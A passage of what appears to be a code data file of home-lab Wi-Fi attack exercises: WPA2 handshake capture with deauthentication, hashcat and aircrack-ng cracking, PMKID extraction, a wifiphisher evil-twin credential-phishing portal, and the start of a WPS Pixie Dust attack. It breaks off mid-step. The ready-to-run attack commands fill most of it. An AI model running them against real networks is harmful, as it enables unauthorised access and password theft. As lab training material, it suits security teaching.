â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚   â”‚ Alfa Adapterâ”‚                   â”‚  Test Clients       â”‚    â”‚
â”‚   â”‚ (wlan0mon)  â”‚                   â”‚  - Old laptop       â”‚    â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                   â”‚  - Android phone    â”‚    â”‚
â”‚                                     â”‚  - IoT devices      â”‚    â”‚
â”‚                                     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                                                                 â”‚
â”‚   âš ï¸  IMPORTANT: Isolate from production network!              â”‚
â”‚   Use Faraday cage or separate VLAN if possible                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
    steps: [
      {
        step: 1,
        title: "Prepare Kali Linux",
        commands: [
          "sudo apt update && sudo apt upgrade -y",
          "sudo apt install aircrack-ng hcxdumptool hcxtools hashcat reaver bully kismet -y",
        ],
        verification: "Run 'airmon-ng' - should show available wireless interfaces",
        notes: "Use VM or dedicated laptop. Never practice on production systems.",
      },
      {
        step: 2,
        title: "Configure Wireless Adapter",
        commands: [
          "lsusb  # Verify adapter detected",
          "iwconfig  # Check interface name",
          "sudo airmon-ng check kill",
          "sudo airmon-ng start wlan0",
          "iwconfig wlan0mon  # Verify Mode:Monitor",
        ],
        verification: "iwconfig shows 'Mode:Monitor' for wlan0mon",
        notes: "If adapter not detected, may need to install drivers (RTL8812AU requires rtl88xxau-aircrack-dkms)",
      },
      {
        step: 3,
        title: "Configure Target Router",
        commands: [],
        verification: "Router broadcasting SSID, accessible via web interface",
        notes: "Configure with WEP, WPA2-PSK, WPS enabled - different configs for different labs. Use non-dictionary password initially, then switch to 'password123' for cracking labs.",
      },
      {
        step: 4,
        title: "Test Capture Capability",
        commands: [
          "sudo airodump-ng wlan0mon",
          "# Should see your test router in the list",
          "# Note the BSSID, Channel, and Encryption",
        ],
        verification: "Test router visible in airodump-ng scan",
        notes: "If not visible, check channel range and 5GHz support of your adapter",
      },
    ],
    successCriteria: [
      "Kali Linux running with all wireless tools installed",
      "Wireless adapter in monitor mode capturing packets",
      "Target router visible and configurable",
      "Lab isolated from production network",
    ],
    troubleshooting: [
      { problem: "Adapter not entering monitor mode", solution: "Run 'airmon-ng check kill' to stop interfering processes" },
      { problem: "No networks visible", solution: "Check if adapter supports 5GHz, or if networks are on 5GHz band" },
      { problem: "Injection test fails", solution: "Verify adapter supports injection: aireplay-ng --test wlan0mon" },
    ],
  },
  {
    id: 2,
    title: "WPA2 Handshake Capture & Crack - Full Walkthrough",
    category: "Cracking",
    difficulty: "Beginner",
    duration: "45-60 minutes",
    description: "Complete guide to capturing and cracking WPA2-PSK handshakes - the most common wireless attack",
    prerequisites: ["Home lab setup complete", "Target router with known weak password"],
    equipment: [
      { item: "Kali Linux with aircrack-ng", required: true },
      { item: "Monitor mode adapter", required: true },
      { item: "Target router (WPA2-PSK)", required: true },
      { item: "Client device to force handshake", required: true },
    ],
    networkDiagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                WPA2 HANDSHAKE ATTACK FLOW                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    1. Capture     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                â”‚
â”‚  â”‚ Attacker â”‚ â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚ Access Point â”‚                â”‚
â”‚  â”‚  (Kali)  â”‚   (all packets)   â”‚  BSSID:      â”‚                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                   â”‚  00:11:22:.. â”‚                â”‚
â”‚       â”‚                         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                â”‚
â”‚       â”‚                                â†‘                         â”‚
â”‚       â”‚ 2. Deauth                      â”‚ 4. 4-way                â”‚
â”‚       â”‚    Inject                      â”‚    Handshake            â”‚
â”‚       â†“                                â”‚    (captured!)          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                        â”‚
â”‚  â”‚              Client Device            â”‚                        â”‚
â”‚  â”‚         (Phone/Laptop)                â”‚                        â”‚
â”‚  â”‚                                       â”‚                        â”‚
â”‚  â”‚  3. Disconnects â”€â”€â†’ 4. Reconnects     â”‚                        â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                        â”‚
â”‚                                                                  â”‚
â”‚  Timeline: Scan â†’ Deauth â†’ Capture â†’ Crack (offline)            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
    steps: [
      {
        step: 1,
        title: "Start Monitor Mode & Scan",
        commands: [
          "sudo airmon-ng check kill",
          "sudo airmon-ng start wlan0",
          "sudo airodump-ng wlan0mon",
          "# Note: BSSID, CH (channel), ENC (WPA2)",
        ],
        verification: "Target network visible with WPA2 encryption",
        notes: "Let scan run 30-60 seconds to see all networks. Note client MACs under 'STATION'.",
      },
      {
        step: 2,
        title: "Focus on Target & Start Capture",
        commands: [
          "sudo airodump-ng -c [CHANNEL] --bssid [TARGET_BSSID] -w handshake_capture wlan0mon",
          "# Example: airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon",
        ],
        verification: "Screen shows only target AP and its connected clients",
        notes: "Leave this running in one terminal. Handshake capture message will appear here.",
      },
      {
        step: 3,
        title: "Force Handshake with Deauthentication",
        commands: [
          "# In NEW terminal:",
          "sudo aireplay-ng -0 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon",
          "# -0 5 = send 5 deauth frames",
          "# -a = target AP BSSID",
          "# -c = target client MAC (optional, omit to deauth all)",
          "",
          "# Example targeting specific client:",
          "sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon",
          "",
          "# Or deauth ALL clients:",
          "sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon",
        ],
        verification: "airodump-ng shows 'WPA handshake: [BSSID]' in top-right",
        notes: "Client will disconnect and automatically reconnect, generating handshake. May need to repeat deauth.",
      },
      {
        step: 4,
        title: "Verify Handshake Capture",
        commands: [
          "# Check capture file:",
          "aircrack-ng handshake_capture-01.cap",
          "# Should show: '1 handshake' for target network",
          "",
          "# Or use wireshark:",
          "wireshark handshake_capture-01.cap",
          "# Filter: eapol",
        ],
        verification: "aircrack-ng confirms handshake present",
        notes: "If no handshake, repeat deauth or wait for client to naturally reconnect.",
      },
      {
        step: 5,
        title: "Crack with Dictionary Attack",
        commands: [
          "# Basic dictionary attack:",
          "sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake_capture-01.cap",
          "",
          "# Or with hashcat (much faster with GPU):",
          "# First convert to hashcat format:",
          "sudo hcxpcapngtool -o hash.22000 handshake_capture-01.cap",
          "",
          "# Then crack:",
          "hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt",
          "",
          "# With rules for variations:",
          "hashcat -m 22000 hash.22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule",
        ],
        verification: "KEY FOUND! message with password displayed",
        notes: "Cracking time depends on password complexity. 'password123' = seconds, random 12-char = years.",
      },
    ],
    successCriteria: [
      "Successfully captured WPA2 4-way handshake",
      "Handshake verified in capture file",
      "Password successfully cracked (with known weak password)",
    ],
    troubleshooting: [
      { problem: "No handshake captured after deauth", solution: "Increase deauth count, try different client, or wait for natural reconnection" },
      { problem: "aircrack-ng says no handshake", solution: "Handshake may be incomplete - need all 4 EAPOL frames. Recapture." },
      { problem: "Cracking takes forever", solution: "Password not in wordlist. Try rules (-r) or larger wordlist." },
    ],
  },
  {
    id: 3,
    title: "PMKID Attack - No Client Required",
    category: "Cracking",
    difficulty: "Intermediate",
    duration: "30-45 minutes",
    description: "Extract PMKID from access point without needing any connected clients - modern attack technique",
    prerequisites: ["Home lab setup", "Router supporting RSN (most modern routers)"],
    equipment: [
      { item: "hcxdumptool and hcxtools", required: true },
      { item: "hashcat with GPU (recommended)", required: false },
      { item: "Monitor mode adapter", required: true },
    ],
    networkDiagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    PMKID EXTRACTION ATTACK                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚  Traditional Handshake Attack:                                   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”   deauth   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”   reconnect   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚  â”‚Attackerâ”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’ â”‚ Client â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚   AP   â”‚      â”‚
â”‚  â”‚        â”‚ â†â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚        â”‚ â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€  â”‚        â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜  handshake â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”‚              (4 frames)                                          â”‚
â”‚                                                                  â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•    â”‚
â”‚                                                                  â”‚
â”‚  PMKID Attack (NO CLIENT NEEDED!):                              â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”  assoc req  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”                              â”‚
â”‚  â”‚Attackerâ”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’ â”‚   AP   â”‚  Client not                  â”‚
â”‚  â”‚        â”‚ â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚        â”‚  required!                   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜  PMKID in   â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜                              â”‚
â”‚              1st frame                                           â”‚
â”‚                                                                  â”‚
â”‚  PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)      â”‚
â”‚  â†³ Derived from password, crackable offline!                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
    steps: [
      {
        step: 1,
        title: "Prepare and Start PMKID Capture",
        commands: [
          "sudo airmon-ng check kill",
          "sudo airmon-ng start wlan0",
          "",
          "# Capture PMKID from all networks:",
          "sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1",
          "",
          "# Or target specific AP:",
          "echo 'AABBCCDDEEFF' > filter.txt  # Target BSSID without colons",
          "sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=filter.txt --filtermode=2 --enable_status=1",
        ],
        verification: "Status output shows PMKID captures",
        notes: "Let run 30-60 seconds per target. Not all APs provide PMKID.",
      },
      {
        step: 2,
        title: "Monitor Capture Progress",
        commands: [
          "# Watch the status output:",
          "# [STATUS] = Overall statistics",
          "# [PMKID] = PMKID captured! (this is what we want)",
          "# [EAPOL] = Handshake captured (bonus)",
          "",
          "# Let run for 2-5 minutes minimum",
          "# Press Ctrl+C when satisfied or PMKID captured",
        ],
        verification: "[PMKID] message appears for target network",
        notes: "Some APs don't send PMKID (older or certain vendors). This is normal.",
      },
      {
        step: 3,
        title: "Convert to Hashcat Format",
        commands: [
          "# Convert pcapng to hashcat hash:",
          "hcxpcapngtool -o hash.22000 pmkid.pcapng",
          "",
          "# Check what was captured:",
          "cat hash.22000",
          "",
          "# PMKID hash starts with: WPA*01*...",
          "# EAPOL hash starts with: WPA*02*...",
          "",
          "# Extract just PMKIDs:",
          "grep 'WPA\\*01' hash.22000 > pmkid_only.22000",
        ],
        verification: "hash.22000 file contains WPA*01* lines",
        notes: "WPA*01* = PMKID, WPA*02* = EAPOL handshake. Both crackable.",
      },
      {
        step: 4,
        title: "Crack PMKID Hash",
        commands: [
          "# Crack with hashcat:",
          "hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt",
          "",
          "# With GPU optimization:",
          "hashcat -m 22000 hash.22000 wordlist.txt -O -w 3",
          "",
          "# With rules:",
          "hashcat -m 22000 hash.22000 wordlist.txt -r best64.rule",
          "",
          "# Check speed:",
          "hashcat -m 22000 --benchmark",
          "",
          "# Show cracked passwords:",
          "hashcat -m 22000 hash.22000 --show",
        ],
        verification: "Password cracked and displayed",
        notes: "PMKID cracking speed is same as EAPOL handshake (~500K-2M/sec on GPU).",
      },
    ],
    successCriteria: [
      "PMKID successfully extracted from target AP",
      "Hash converted to hashcat format",
      "Password cracked using dictionary attack",
    ],
    troubleshooting: [
      { problem: "No PMKID captured", solution: "AP may not support RSN/PMKID. Try different target or use handshake attack." },
      { problem: "hcxdumptool crashes", solution: "Kill NetworkManager completely, check driver support" },
      { problem: "Hash won't crack", solution: "Password not in wordlist. Need larger list or try rules." },
    ],
  },
  {
    id: 4,
    title: "Evil Twin Attack with Wifiphisher",
    category: "Phishing",
    difficulty: "Intermediate",
    duration: "60-90 minutes",
    description: "Create convincing rogue access point to capture credentials via phishing portal",
    prerequisites: ["Two wireless adapters (one for rogue AP, one for deauth)", "Understanding of social engineering"],
    equipment: [
      { item: "Two wireless adapters supporting monitor mode", required: true },
      { item: "wifiphisher installed", required: true },
      { item: "Client devices for testing", required: true },
    ],
    networkDiagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    EVIL TWIN ATTACK FLOW                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚  BEFORE ATTACK:                                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”    Connected    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                 â”‚
â”‚  â”‚ Client â”‚ â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’ â”‚  Legitimate AP  â”‚                 â”‚
â”‚  â”‚ Device â”‚                 â”‚  SSID: HomeWiFi â”‚                 â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜                 â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                 â”‚
â”‚                                                                  â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•   â”‚
â”‚                                                                  â”‚
â”‚  DURING ATTACK:                                                  â”‚
â”‚                                                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚
â”‚  â”‚                    ATTACKER                           â”‚       â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”‚       â”‚
â”‚  â”‚  â”‚ Adapter 1â”‚              â”‚ Adapter 2â”‚              â”‚       â”‚
â”‚  â”‚  â”‚ (deauth) â”‚              â”‚ (rogue AP)â”‚             â”‚       â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â”‚       â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â”‚
â”‚         â”‚                           â†‘                            â”‚
â”‚         â”‚ Deauth frames             â”‚ "HomeWiFi" (clone)        â”‚
â”‚         â†“                           â”‚ (stronger signal)         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                â”‚                            â”‚
â”‚  â”‚  Legitimate AP  â”‚                â”‚                            â”‚
â”‚  â”‚  (being jammed) â”‚                â”‚                            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                â”‚                            â”‚
â”‚         â†“                           â”‚                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                 â”‚                            â”‚
â”‚  â”‚ Client Device  â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                            â”‚
â”‚  â”‚ 1. Disconnectedâ”‚    2. Auto-connects to                      â”‚
â”‚  â”‚ 2. Sees "fake" â”‚       "strongest" signal                    â”‚
â”‚  â”‚    HomeWiFi    â”‚    3. Presented with                        â”‚
â”‚  â”‚ 3. Enters credsâ”‚       phishing portal                       â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                              â”‚
â”‚                                                                  â”‚
â”‚  Portal: "Router firmware update - enter WiFi password"         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
    steps: [
      {
        step: 1,
        title: "Install and Verify Wifiphisher",
        commands: [
          "sudo apt install wifiphisher -y",
          "",
          "# Verify adapters detected:",
          "iwconfig",
          "# Should show wlan0 and wlan1 (or similar)",
          "",
          "# Check wifiphisher scenarios:",
          "wifiphisher --help",
          "ls /usr/share/wifiphisher/phishingpages/",
        ],
        verification: "Two wireless adapters visible, wifiphisher installed",
        notes: "If only one adapter, cannot run deauth and rogue AP simultaneously.",
      },
      {
        step: 2,
        title: "Launch Wifiphisher",
        commands: [
          "# Basic launch (interactive mode):",
          "sudo wifiphisher",
          "",
          "# Or specify interfaces and scenario:",
          "sudo wifiphisher -aI wlan0 -jI wlan1 -p wifi_connect",
          "# -aI = interface for rogue AP",
          "# -jI = interface for jamming/deauth",
          "# -p = phishing scenario",
          "",
          "# Available scenarios:",
          "# wifi_connect - Captures WPA password",
          "# firmware-upgrade - Fake router update",
          "# oauth-login - Fake OAuth login",
          "# plugin_update - Fake browser plugin",
        ],
        verification: "Wifiphisher interface launches, shows available networks",
        notes: "Select target network from list. Wifiphisher will clone SSID and channel.",
      },
      {
        step: 3,
        title: "Select Target and Monitor",
        commands: [
          "# In wifiphisher interface:",
          "# 1. Select target network with arrow keys + Enter",
          "# 2. Wifiphisher automatically:",
          "#    - Creates clone AP with same SSID",
          "#    - Starts deauthing legitimate AP",
          "#    - Waits for clients to connect",
          "",
          "# Monitor output for:",
          "# - Connected clients",
          "# - HTTP requests to portal",
          "# - Submitted credentials",
        ],
        verification: "Clients connecting to rogue AP and seeing portal",
        notes: "Be patient - clients may take 30-60 seconds to auto-reconnect.",
      },
      {
        step: 4,
        title: "Capture and Verify Credentials",
        commands: [
          "# Credentials displayed in wifiphisher output",
          "# Also logged to file:",
          "cat /tmp/wifiphisher-credentials.txt",
          "",
          "# Test captured password on real network:",
          "nmcli dev wifi connect 'HomeWiFi' password 'captured_password'",
        ],
        verification: "Password captured and works on legitimate network",
        notes: "In real engagement, immediately report success and stop attack.",
      },
    ],
    successCriteria: [
      "Rogue AP successfully cloned target network",
      "Clients redirected to phishing portal",
      "Credentials captured via portal submission",
      "Captured password verified working",
    ],
    troubleshooting: [
      { problem: "Clients won't connect to rogue AP", solution: "Increase deauth rate, position closer to clients than legitimate AP" },
      { problem: "Portal not loading", solution: "Check DHCP/DNS configuration, firewall rules" },
      { problem: "Only one adapter detected", solution: "Need two adapters for simultaneous deauth + AP" },
    ],
  },
  {
    id: 5,
    title: "WPS Pixie Dust Attack",
    category: "WPS",
    difficulty: "Beginner",
    duration: "15-30 minutes",
    description: "Exploit weak random number generation in WPS to recover PIN and WiFi password instantly",
    prerequisites: ["Router with WPS enabled", "Vulnerable WPS implementation"],
    equipment: [
      { item: "reaver or bully", required: true },
      { item: "wash for scanning", required: true },
      { item: "Monitor mode adapter", required: true },
    ],
    networkDiagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    WPS PIXIE DUST ATTACK                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚  WPS PIN Structure:                                              â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚    PIN:   1 2 3 4   5 6 7   (8)                          â”‚    â”‚
â”‚  â”‚           â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                          â”‚    â”‚
â”‚  â”‚           First half  Second   Checksum                  â”‚    â”‚
â”‚  â”‚           (10â´)      half(10Â³) (calculated)              â”‚    â”‚
â”‚  â”‚                                                           â”‚    â”‚
â”‚  â”‚  Total combinations: 10,000 + 1,000 = 11,000             â”‚    â”‚
â”‚  â”‚  (Not 100,000,000!)                                       â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                                                                  â”‚
â”‚  Pixie Dust Attack:                                              â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    M1,M2     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚  Attacker  â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’  â”‚  Target AP â”‚                     â”‚
â”‚  â”‚  (reaver)  â”‚ â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€  â”‚  (WPS)     â”‚                     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   E-Hash1,2  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                                                                  â”‚
â”‚  E-Hash = HMAC(AuthKey, E-S* | PSK* | PK_E | PK_R)              â”‚
â”‚                          â†‘                                       â”‚
â”‚                    Weak RNG here!                                â”‚
â”‚                                                                  â”‚
â”‚  If E-S1 and E-S2 are predictable (weak RNG):                   â”‚
â”‚  â†’ Can derive PSK1 and PSK2 (PIN halves)                        â”‚
â”‚  â†’ Instant PIN recovery! (no bruteforce needed)                 â”‚
â”‚                                                                  â”‚
â”‚  Timeline: Scan â†’ 1 request â†’ PIN recovered â†’ PSK recovered     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
    steps: [
      {
        step: 1,
        title: "Scan for WPS-Enabled Networks",
        commands: [
          "sudo airmon-ng check kill",
          "sudo airmon-ng start wlan0",
          "",
          "# Scan for WPS:",
          "sudo wash -i wlan0mon",
          "",
          "# Output columns:",
          "# BSSID | Channel | RSSI | WPS Ver | WPS Locked | ESSID",
          "# Look for: Lck = No (not rate-limited)",
        ],
        verification: "Target AP shows WPS enabled, Lck = No",
        notes: "If 'Lck = Yes', AP has WPS lockout active. Wait or try different target.",
      },
      {
        step: 2,
        title: "Try Pixie Dust Attack",
        commands: [
          "# Pixie Dust with reaver:",
